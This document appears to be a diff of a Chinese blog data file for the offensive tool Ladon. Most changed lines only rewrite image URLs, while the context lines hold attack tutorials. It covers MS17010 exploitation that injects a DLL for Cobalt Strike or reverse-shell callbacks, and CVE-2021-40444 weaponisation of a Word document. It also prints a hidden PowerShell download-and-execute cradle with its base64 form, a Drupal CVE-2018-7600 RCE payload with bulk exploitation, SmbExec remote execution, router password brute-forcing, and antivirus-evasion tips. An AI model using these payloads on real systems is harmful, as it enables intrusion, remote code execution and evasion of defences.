+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_calc.PNG"></p>
+<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_calc.gif"></p>
 <h4 id="MS17010漏洞CS上线演示"><a href="#MS17010漏洞CS上线演示" class="headerlink" title="MS17010漏洞CS上线演示"></a>MS17010漏洞CS上线演示</h4><p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 配置好CS监听器，使用“Web Delivery”生成powershell的URL监听<br>3 LadonGUI-CmdDLL-CS文本框填写URL，如<a href="http://192.168.1.108/a，生成x86的DLL(目标32位系统)" target="_blank" rel="noopener">http://192.168.1.108/a，生成x86的DLL(目标32位系统)</a><br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机并将dll注入explorer.exe,注入explorer进程得到的是当前用户权限，如果注入lsass.exe得到的是system权限，其它进程也是同理，看进程启动所使用的权限，实际测试请根据需要，如遇到不出网的情况，需添加用户注入explorer可能就会失败，因为有些机器开启UAC。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
 <h4 id="MS17010漏洞NC反弹演示"><a href="#MS17010漏洞NC反弹演示" class="headerlink" title="MS17010漏洞NC反弹演示"></a>MS17010漏洞NC反弹演示</h4><p>可能有些机器存在杀软查杀CS，导致无法直接上线CS，这时我们可使用NC或MSF上线</p>
 <p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 打开LadonGui-NetCat-启动监听，默认监听本机4444端口,使用 Ladon web 800 启动WEB，在GUI里填写对应PS1的下载地址，如<a href="http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听" target="_blank" rel="noopener">http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听</a><br>3 LadonGUI-CmdDLL-填写IP和端口，生成NC x86的DLL(目标32位系统)<br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机，成功反弹shell</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
 <p>####　CVE-2021-40444 Office漏洞复现CS上线</p>
 <p><a href="https://k8gege.org/Ladon/CVE-2021-40444.html">https://k8gege.org/Ladon/CVE-2021-40444.html</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.9版本：K8小密圈</p>
@@ -4383,27 +4383,27 @@ window.location.href="https://k8gege.org/Ladon/CVE-2021-40444.html";
 <p>PS：此模块需使用Ladon40.exe</p>
 <h3 id="CVE-2021-40444复现"><a href="#CVE-2021-40444复现" class="headerlink" title="CVE-2021-40444复现"></a>CVE-2021-40444复现</h3><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h4><p>Win10 x64<br>0ffice 2019</p>
 <h4 id="安装Office2019"><a href="#安装Office2019" class="headerlink" title="安装Office2019"></a>安装Office2019</h4><p>随便找个试用版就可以了，没必要激活，如果下的是IMG把IMG改为ZIP解压安装即可。</p>
-<h4 id="CmdDll生成dll"><a href="#CmdDll生成dll" class="headerlink" title="CmdDll生成dll"></a>CmdDll生成dll</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/CmdDll.PNG"></p>
+<h4 id="CmdDll生成dll"><a href="#CmdDll生成dll" class="headerlink" title="CmdDll生成dll"></a>CmdDll生成dll</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/CmdDll.PNG"></p>
 <h4 id="CVE-2021-40444-MakeCab将DLL转成CAB"><a href="#CVE-2021-40444-MakeCab将DLL转成CAB" class="headerlink" title="CVE-2021-40444 MakeCab将DLL转成CAB"></a>CVE-2021-40444 MakeCab将DLL转成CAB</h4><p>由于目标是Win10 X64系统，所以我们使用64位的DLL，命令：Ladon CVE-2021-40444 MakeCab sc64.dll</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-CAB.PNG"></p>
-<h4 id="CVE-2021-40444-MakeHtml生成Poc-html"><a href="#CVE-2021-40444-MakeHtml生成Poc-html" class="headerlink" title="CVE-2021-40444 MakeHtml生成Poc.html"></a>CVE-2021-40444 MakeHtml生成Poc.html</h4><p>生成html，URL需指向Ladon监听的地址<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-htm.PNG"></p>
-<h4 id="启动web监听"><a href="#启动web监听" class="headerlink" title="启动web监听"></a>启动web监听</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-htm.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/CVE-2021-40444-CAB.PNG"></p>
+<h4 id="CVE-2021-40444-MakeHtml生成Poc-html"><a href="#CVE-2021-40444-MakeHtml生成Poc-html" class="headerlink" title="CVE-2021-40444 MakeHtml生成Poc.html"></a>CVE-2021-40444 MakeHtml生成Poc.html</h4><p>生成html，URL需指向Ladon监听的地址<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/CVE-2021-40444-htm.PNG"></p>
+<h4 id="启动web监听"><a href="#启动web监听" class="headerlink" title="启动web监听"></a>启动web监听</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/CVE-2021-40444-htm.PNG"></p>
 <h4 id="doc样本修改"><a href="#doc样本修改" class="headerlink" title="doc样本修改"></a>doc样本修改</h4><p>样本9月10号已发在小密圈，docx后缀改为cab或zip，即可编辑rels文件，指向Ladon监听的地址poc.html，保存再改名为.docx</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-doc.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/CVE-2021-40444-doc.PNG"></p>
 <h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>在win10上执行doc文件时，可通过Ladon监听看到整个请求过程，docx先访问html，由漏洞触发加载我们封装的CAB文件，通过CPL执行安装INF，加载我们的DLL，演示DLL功能为弹计算器。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cve-2021-40444.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cve-2021-40444.gif"></p>
 <h3 id="Cobalt-Strike上线"><a href="#Cobalt-Strike上线" class="headerlink" title="Cobalt Strike上线"></a>Cobalt Strike上线</h3><h4 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h4><p>LadonGui—Encode–Base64Unicode加密</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.250.25:80/a'))"</span></span><br></pre></td></tr></table></figure>
 
 <p>PS： 其它复杂CMD语句同理</p>
 <h4 id="生成DLL"><a href="#生成DLL" class="headerlink" title="生成DLL"></a>生成DLL</h4><p>Ladon.exe CmdDll b64x64 cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADUAMAAuADIANQA6ADgAMAAvAGEAJwApACkAIgA=</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cs_base64.PNG"></p>
-<h4 id="CS上线演示"><a href="#CS上线演示" class="headerlink" title="CS上线演示"></a>CS上线演示</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cve-2021-40444-cs.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cs_base64.PNG"></p>
+<h4 id="CS上线演示"><a href="#CS上线演示" class="headerlink" title="CS上线演示"></a>CS上线演示</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cve-2021-40444-cs.gif"></p>
 <h3 id="SmbExec用法"><a href="#SmbExec用法" class="headerlink" title="SmbExec用法"></a>SmbExec用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load SmbExec</span><br><span class="line">Usage:</span><br><span class="line">Ladon SmbExec host user pass cmd whoami</span><br><span class="line">Ladon SmbExec host user pass b64cmd dwBoAG8AYQBtAGkA</span><br></pre></td></tr></table></figure>
 
 <h3 id="SmbExec执行"><a href="#SmbExec执行" class="headerlink" title="SmbExec执行"></a>SmbExec执行</h3><p>在Cobalt Strike的shell下执行SmbExec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2以后版本使用Base64Unicode加密生成</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/Gui82.PNG"></p>
-<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbExec.PNG"><br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbExec2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Gui82.PNG"></p>
+<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbExec.PNG"><br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbExec2.PNG"></p>
 <h4 id="Ladon其它横向移动模块"><a href="#Ladon其它横向移动模块" class="headerlink" title="Ladon其它横向移动模块"></a>Ladon其它横向移动模块</h4><table>
 <thead>
 <tr>
@@ -4491,8 +4491,8 @@ window.location.href="https://k8gege.org/Ladon/SmbExec.html";
 <h3 id="模块用法"><a href="#模块用法" class="headerlink" title="模块用法"></a>模块用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load SmbExec</span><br><span class="line">Usage:</span><br><span class="line">Ladon SmbExec host user pass cmd whoami</span><br><span class="line">Ladon SmbExec host user pass b64cmd dwBoAG8AYQBtAGkA</span><br></pre></td></tr></table></figure>
 
 <h3 id="SmbExec执行"><a href="#SmbExec执行" class="headerlink" title="SmbExec执行"></a>SmbExec执行</h3><p>在Cobalt Strike的shell下执行SmbExec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2以后版本使用Base64Unicode加密生成</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/Gui82.PNG"></p>
-<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbExec.PNG"><br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/SmbExec2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Gui82.PNG"></p>
+<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbExec.PNG"><br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbExec2.PNG"></p>
 <h4 id="Ladon其它横向移动模块"><a href="#Ladon其它横向移动模块" class="headerlink" title="Ladon其它横向移动模块"></a>Ladon其它横向移动模块</h4><table>
 <thead>
 <tr>
@@ -4576,7 +4576,7 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 <h3 id="更新功能"><a href="#更新功能" class="headerlink" title="更新功能"></a>更新功能</h3><p>Ladon 8.7 2021.8.14<br>[+]UsbLog USB使用记录查看(USB名称、USB标记、路径信息)</p>
 <h3 id="Ladon查看"><a href="#Ladon查看" class="headerlink" title="Ladon查看"></a>Ladon查看</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon UsbLog</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/UsbLog.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/UsbLog.PNG"></p>
 <h3 id="C-查看"><a href="#C-查看" class="headerlink" title="C#查看"></a>C#查看</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">            USBConnKey &#x3D; Registry.LocalMachine.OpenSubKey(@&quot;SYSTEM\CurrentControlSet\Enum\USBSTOR&quot;, false);</span><br><span class="line">            foreach (string sub1 in USBConnKey.GetSubKeyNames())</span><br><span class="line">            &#123;</span><br><span class="line">                RegistryKey sub1key &#x3D; USBConnKey.OpenSubKey(sub1, false);</span><br><span class="line">                foreach (string sub2 in sub1key.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    try</span><br><span class="line">                    &#123;</span><br><span class="line">                        RegistryKey sub2key &#x3D; sub1key.OpenSubKey(sub2, false);</span><br><span class="line">                        if (sub2key.GetValue(&quot;Service&quot;, &quot;&quot;).Equals(&quot;disk&quot;))</span><br><span class="line">                        &#123;</span><br><span class="line">                            String Path &#x3D; &quot;USBSTOR&quot; + &quot;\\&quot; + sub1 + &quot;\\&quot; + sub2;</span><br><span class="line">                            String Name &#x3D; (string)sub2key.GetValue(&quot;FriendlyName&quot;, &quot;&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;USB_Name: &quot; + Name);</span><br><span class="line">                            Console.WriteLine(&quot;UID_Tag: &quot; + sub2);</span><br><span class="line">                            Console.WriteLine(&quot;Path: &quot; + Path + &quot;\r\n&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch (Exception msg)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(msg.Message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#96;&#96;&#96;		</span><br><span class="line">			</span><br><span class="line">### Cmd查看</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;Bash</span><br><span class="line">for &#x2F;f  %i in (&#39;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR&#39;) do @for &#x2F;f %x in (&#39;reg query &quot;%i&quot;&#39;) do @reg query &quot;%x&quot; &#x2F;v FriendlyName | findstr FriendlyName</span><br></pre></td></tr></table></figure>
 
 <h3 id="Bat查看"><a href="#Bat查看" class="headerlink" title="Bat查看"></a>Bat查看</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  %%i <span class="keyword">in</span> (<span class="string">'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR'</span>) <span class="keyword">do</span> @<span class="keyword">for</span> /f %%x <span class="keyword">in</span> (<span class="string">'reg query "%%i"'</span>) <span class="keyword">do</span> @reg query <span class="string">"%%x"</span> /v FriendlyName | findstr FriendlyName</span><br></pre></td></tr></table></figure>
@@ -4607,27 +4607,27 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 <p>执行如下命令启动drupal 8.5.0的环境：</p>
 <p>docker-compose up -d</p>
 <p>环境启动后，访问<a href="http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。" target="_blank" rel="noopener">http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</a></p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/0.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2018-7600/0.PNG"></p>
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[<span class="comment">#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonExp.exe生成POC，填写对应字段，具体参数如下</p>
 <p>TargetURL: 目标URL<br>Addurl: /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax<br>Post:   form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</p>
 <p>只需以上3个参数即可，点击BuildExe生成EXE，再点击TestEXE测试，如图所示成功执行ID命令。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/1.PNG"><br>PS：Payload中的exec也可换成system、passthru或其它PHP函数</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2018-7600/1.PNG"><br>PS：Payload中的exec也可换成system、passthru或其它PHP函数</p>
 <h3 id="Ladon调用"><a href="#Ladon调用" class="headerlink" title="Ladon调用"></a>Ladon调用</h3><p>生成的POC或EXP可使用Ladon调用，单个URL用法如下：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon http://192.168.1.8:8080 LadonPoc.exe</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2018-7600/2.PNG"></p>
 <h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><p>由于url不像ip那样可使用IP/24、IP/XX来批量，所以我们可配置url.txt来批量利用EXP。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt LadonPoc.exe</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/3.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/CVE-2018-7600/3.PNG"></p>
 <h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>实战时可使用LadonGui的SubDomain来快速获取目标子域名并识别出使用Drupal的域名，再把对应URL放入url.txt，即可使用Ladon批量EXP。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p>
 <p>如果已整理好URL，可使用WhatCMS快速识别</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -4651,7 +4651,7 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 
 <h4 id="注释Exchange"><a href="#注释Exchange" class="headerlink" title="注释Exchange"></a>注释Exchange</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    //vul.GetExFQND(Target)</span><br><span class="line">//&#125; <span class="keyword">else</span> <span class="keyword">if</span> ScanType == <span class="string">"CVE-2021-26855"</span> &#123;</span><br><span class="line">    //vul.CheckCVE_2021_26855(Target)</span><br></pre></td></tr></table></figure>
 
-<p>注释MS17010后发现，提示杀CVE-2021-26855，所以它也注释掉，注释后再丢进去发现可以正常执行Ladon了<br><img alt data-original="https://k8gege.org/k8img/LadonGo/LadonGobypasswin10.PNG"></p>
+<p>注释MS17010后发现，提示杀CVE-2021-26855，所以它也注释掉，注释后再丢进去发现可以正常执行Ladon了<br><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/LadonGobypasswin10.PNG"></p>
 <h3 id="加密免杀"><a href="#加密免杀" class="headerlink" title="加密免杀"></a>加密免杀</h3><p>通过注释掉被杀代码，Ladon立马免杀了，但是我们也丢失了功能，对于很多工具免杀也是一样，急用的话可通过删除功能来解决。但是我们需要那个功能怎么办？那必须得做真正的免杀，而不是单纯的删除功能免杀。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ScanType == <span class="string">"MS17010"</span> &#123;</span><br><span class="line">    //smb.MS17010(Target,3)</span><br></pre></td></tr></table></figure>
 
@@ -4661,7 +4661,7 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 <p>ms17010.go里对应函数也要修改成MS17888,再测试发现此时免杀也可使用MS17010漏洞探测功能。但这样改不好，我们的命令变成Ladon 192.168.1.1/24 MS17888了,时间久了或工具很多谁会记得是对应哪个洞。所以我们应该把字符串MS17010加密，代码如下XXENCODE为自己的加密函数如公开的BASE64或其它加密均可，DFKKJL82为MS17010加密后的密文，这样我们在命令行输入MS17010时，内部对应的还是MS17010探测。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> XXENCODE(ScanType) == <span class="string">"DFKKJL82"</span> &#123;</span><br><span class="line">    smb.MS17888(Target,3)</span><br></pre></td></tr></table></figure>
 
-<p>加密模块名称免杀后，依旧可使用MS17010模块扫描内网<br><img alt data-original="https://k8gege.org/k8img/LadonGo/ms17010_win10.PNG"></p>
+<p>加密模块名称免杀后，依旧可使用MS17010模块扫描内网<br><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/ms17010_win10.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -4686,12 +4686,12 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 <h3 id="NBT获取主机信息"><a href="#NBT获取主机信息" class="headerlink" title="NBT获取主机信息"></a>NBT获取主机信息</h3><p>结果: IP、机器名、MAC地址、域名</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 NbtInfo</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/NBT_macbook.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/NBT_macbook.PNG"></p>
 <h3 id="RouterOS路由器8728端口密码爆破"><a href="#RouterOS路由器8728端口密码爆破" class="headerlink" title="RouterOS路由器8728端口密码爆破"></a>RouterOS路由器8728端口密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 RouterOSScan</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/RouterOSScan.PNG"></p>
-<h4 id="CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42"><a href="#CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42" class="headerlink" title="CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)"></a>CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)</h4><p><img alt data-original="https://k8gege.org/k8img/LadonGo/exp/IPtxt_CVE-2018-14847.PNG"></p>
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/exp/Kali_CVE-2018-14847.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/RouterOSScan.PNG"></p>
+<h4 id="CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42"><a href="#CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42" class="headerlink" title="CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)"></a>CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)</h4><p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/exp/IPtxt_CVE-2018-14847.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/exp/Kali_CVE-2018-14847.PNG"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -4716,12 +4716,12 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
 <h3 id="NBT获取主机信息"><a href="#NBT获取主机信息" class="headerlink" title="NBT获取主机信息"></a>NBT获取主机信息</h3><p>结果: IP、机器名、MAC地址、域名</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 NbtInfo</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/NBT_macbook.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/NBT_macbook.PNG"></p>
 <h3 id="RouterOS路由器8728端口密码爆破"><a href="#RouterOS路由器8728端口密码爆破" class="headerlink" title="RouterOS路由器8728端口密码爆破"></a>RouterOS路由器8728端口密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 RouterOSScan</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/RouterOSScan.PNG"></p>
-<h4 id="CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42"><a href="#CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42" class="headerlink" title="CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)"></a>CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)</h4><p><img alt data-original="https://k8gege.org/k8img/LadonGo/exp/IPtxt_CVE-2018-14847.PNG"></p>
-<p><img alt data-original="https://k8gege.org/k8img/LadonGo/exp/Kali_CVE-2018-14847.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/RouterOSScan.PNG"></p>
+<h4 id="CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42"><a href="#CVE-2018-14847-Export-RouterOS-Password-6-29-to-6-42" class="headerlink" title="CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)"></a>CVE-2018-14847 (Export RouterOS Password 6.29 to 6.42)</h4><p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/exp/IPtxt_CVE-2018-14847.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/LadonGo/exp/Kali_CVE-2018-14847.PNG"></p>
